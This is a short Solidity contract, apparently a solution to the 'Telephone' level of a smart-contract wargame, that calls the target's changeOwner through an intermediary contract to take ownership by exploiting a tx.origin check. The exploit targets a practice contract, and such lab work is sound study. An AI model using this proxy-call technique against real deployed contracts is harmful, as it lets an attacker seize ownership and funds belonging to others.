// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level04.sol";

contract Attack {
    Telephone instance;

    constructor(Telephone _instance) {
        instance = _instance;
    }

    function attack() public {
        instance.changeOwner(msg.sender);
    }
}
